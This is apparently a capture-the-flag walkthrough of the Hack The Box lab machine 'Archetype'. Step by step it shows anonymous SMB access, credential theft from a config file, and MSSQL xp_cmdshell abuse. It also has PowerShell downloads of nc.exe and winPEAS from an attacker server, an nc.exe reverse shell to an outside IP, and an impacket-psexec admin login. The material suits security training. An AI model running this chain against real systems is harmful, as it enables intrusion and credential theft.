# ARCHETYPE

STARTING POINT - TIER 2

## Enumeration

**Nmap scan**

```bash
nmap -sC -sV 10.129.210.53
```

![nmap1](pics/nmap1.png)

![nmap2](pics/nmap2.png)

## Exploitation

**Connect SMB**

```bash
smbclient -N -L \\\\10.129.210.53\\
```

![smb1](pics/smb1.png)

- Connect via backups user

```bash
smbclient -N \\\\10.129.210.53\\backups
```

![smb2](pics/smb2.png)

**Get config file**

```bash
get prod.dtsConfig
```

![smb3](smb3.png)

**Exit SMB Server and read config file**

![config](pics/config.png)

**Connect to MSSQL by using `mssqlclient.py`**

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.210.53 -windows-auth
```

![mssql1](pics/mssql1.png)

- Password is in config file.

**Enable xp_cmdshell**

![mssql2](pics/mssql2.png)

![mssql3](pics/mssql3.png)

**Prepare some tools for Windows Exploitation**

![tool](pics/tool.png)

- nc.exe
- winPEASx64.exe

**Open a Server**

```bash
sudo python3 -m http.server 80
```

![server](pics/server.png)

**At victim machine, connect to attacker machine then download `nc.exe`**

```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.235/nc.exe -outfile nc.exe"
```

![sql1](pics/sql1.png)

```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.235/winPEASx64.exe -outfile winpeas.exe"
```

![sql2](pics/sql2.png)
**Create a reverse shell**

```bash
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.15.235 4444"
```

![shell1](pics/shell1.png)

![shell2](pics/shell2.png)

**`cd` to Desktop then list all files**

![dir](pics/dir.png)

**Read `user.txt` file**

![type](pics/type.png)

**Run `winPEASx64.exe`**

```bash
.\winpeas.exe
```

![winpeas](pics/winpeas.png)

- Found a file store information about Administrator

![file1](pics/file1.png)

- Read contents of the file

![file2](pics/file2.png)

**Using `impacket-psexec` to connect server as administrator**

```bash
/usr/bin/impacket-psexec administrator@10.129.210.53
```

![win](pics/win.png)

**Move to Desktop and read get secret file**

![root](pics/root.png)
